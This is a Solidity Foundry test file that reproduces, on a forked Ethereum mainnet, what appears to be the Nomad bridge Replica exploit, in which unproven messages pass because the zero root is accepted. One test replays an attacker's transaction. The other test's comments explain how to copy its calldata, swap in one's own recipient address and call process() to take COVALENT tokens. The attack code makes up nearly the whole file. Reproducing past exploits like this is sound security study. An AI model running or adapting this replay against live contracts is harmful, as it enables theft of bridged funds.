// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";

import "solmate/tokens/ERC20.sol";
import "./Messsage.sol";

interface ReplicaLike {
    /**
     * @notice Given formatted message, attempts to dispatch
     * message payload to end recipient.
     * @dev Recipient must implement a `handle` method (refer to IMessageRecipient.sol)
     * Reverts if formatted message's destination domain is not the Replica's domain,
     * if message has not been proven,
     * or if not enough gas is provided for the dispatch transaction.
     * @param _message Formatted message
     * @return _success TRUE iff dispatch transaction succeeded
     */
    function process(bytes memory _message) external returns (bool _success);

    function localDomain() external returns (uint32);

    /**
     * @notice Check that the root has been submitted
     * and that the optimistic timeout period has expired,
     * meaning the root can be processed
     * @param _root the Merkle root, submitted in an update, to check
     * @return TRUE iff root has been submitted & timeout has expired
     */
    function acceptableRoot(bytes32 _root) external view returns (bool);

    // Mapping of message leaves to MessageStatus
    function messages(bytes32 message) external view returns (bytes32);
}

contract TestExploit is Test {
    using TypedMemView for bytes;
    using TypedMemView for bytes29;

    using Message for bytes29;

    ReplicaLike internal REPLICA = ReplicaLike(0x5D94309E5a0090b165FA4181519701637B6DAEBA);

    address internal REPLICA_IMPLEMENTATION_ADDRESS = 0xB92336759618F55bd0F8313bd843604592E27bd8;

    function setUp() public {
        vm.label(address(REPLICA), "proxy[Replica]");
        vm.label(REPLICA_IMPLEMENTATION_ADDRESS, "implementatoin[Replica]");
    }

    function testSimulation() external {
        // Simulation https://etherscan.io/tx/0x084e2a13e374ec45b412f8dc51a7e9a744efefbe5fde7521a9a4e7d59fedc0bd
        // This transaction is inclued in block at 15259595
        // Fork block number at 15259594

        ERC20 COVALENT = ERC20(0xD417144312DbF50465b1C641d016962017Ef6240);
        address sender = 0x56D8B635A7C88Fd1104D23d632AF40c1C3Aac4e3;
        address recipient = 0xf57113D8f6Ff35747737f026fE0B37D4D7f42777;

        // You can see recipient address in the following message.
        bytes
            memory _messageData = hex"65766d730000000000000000000000002eff94f8c56c20f85d45e9752bfec3c0522c55c700002de90065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300657468000000000000000000000000d417144312dbf50465b1c641d016962017ef624003000000000000000000000000f57113d8f6ff35747737f026fe0b37d4d7f42777000000000000000000000000000000000000000000001fc5af4729b102cbd00008dd7e875c6f07eb114044d484f7f37e03ee359aac52cdd4b00af4d97e78c603";

        bytes29 _m = _messageData.ref(0);
        bytes32 _messageHash = _m.keccak();

        console.logBytes32(_messageHash);
        console.logBytes32(REPLICA.messages(_messageHash));

        // ensure message was meant for this domain
        assertEq(_m.destination(), REPLICA.localDomain(), "something wrong with message");

        // root of a message which had not been proven would be 0x00, because messages[_messageHash] would be uninitialized.
        // unfortunately, actually 0x00 is acceptable root.
        // @samczsun https://twitter.com/samczsun/status/1554258955991277568
        // The first accepted root is set to 0x00 and the confirmed time is "1" (the start of time).
        assertTrue(REPLICA.acceptableRoot(bytes32(0))); // Oops
        assertEq(REPLICA.messages(_messageHash), bytes32(0)); // eusure message[_messageHash] is 0x00

        uint256 bal = COVALENT.balanceOf(recipient);
        vm.prank(sender);
        REPLICA.process(_messageData);
        uint256 balDiff = COVALENT.balanceOf(recipient) - bal;
        assertGt(balDiff, 0);
    }

    function testMimicExploit() external {
        // Fork block number at 15259594
        // Purpose: Mimic the following transaction https://etherscan.io/tx/0x084e2a13e374ec45b412f8dc51a7e9a744efefbe5fde7521a9a4e7d59fedc0bd

        ERC20 COVALENT = ERC20(0xD417144312DbF50465b1C641d016962017Ef6240);
        address sender = address(0xABCD);
        address recipient = 0x004870D27dFd8C851c596c4dD4BbB0DabccaAc0a;

        // Copy-paste data field in transaction
        // 65766d730000000000000000000000002eff94f8c56c20f85d45e9752bfec3c0522c55c700002de90065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300657468000000000000000000000000d417144312dbf50465b1c641d016962017ef624003000000000000000000000000f57113d8f6ff35747737f026fe0b37d4d7f42777000000000000000000000000000000000000000000001fc5af4729b102cbd00008dd7e875c6f07eb114044d484f7f37e03ee359aac52cdd4b00af4d97e78c603
        // Replace the recipient address (0xf57113D8f6Ff35747737f026fE0B37D4D7f42777) with own address
        // 65766d730000000000000000000000002eff94f8c56c20f85d45e9752bfec3c0522c55c700002de90065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300657468000000000000000000000000d417144312dbf50465b1c641d016962017ef624003000000000000000000000000004870D27dFd8C851c596c4dD4BbB0DabccaAc0a000000000000000000000000000000000000000000001fc5af4729b102cbd00008dd7e875c6f07eb114044d484f7f37e03ee359aac52cdd4b00af4d97e78c603
        bytes
            memory _messageData = hex"65766d730000000000000000000000002eff94f8c56c20f85d45e9752bfec3c0522c55c700002de90065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300657468000000000000000000000000d417144312dbf50465b1c641d016962017ef624003000000000000000000000000004870D27dFd8C851c596c4dD4BbB0DabccaAc0a000000000000000000000000000000000000000000001fc5af4729b102cbd00008dd7e875c6f07eb114044d484f7f37e03ee359aac52cdd4b00af4d97e78c603";

        bytes29 _m = _messageData.ref(0);
        bytes32 _messageHash = _m.keccak();

        assertEq(_m.destination(), REPLICA.localDomain(), "something wrong with message");
        assertTrue(REPLICA.acceptableRoot(bytes32(0))); // Oops
        assertEq(REPLICA.messages(_messageHash), bytes32(0), "message status must be 0x00"); // eusure message[_messageHash] is 0x00

        uint256 bal = COVALENT.balanceOf(recipient);
        vm.prank(sender);
        REPLICA.process(_messageData);
        uint256 balDiff = COVALENT.balanceOf(recipient) - bal;
        assertGt(balDiff, 0);
    }
}
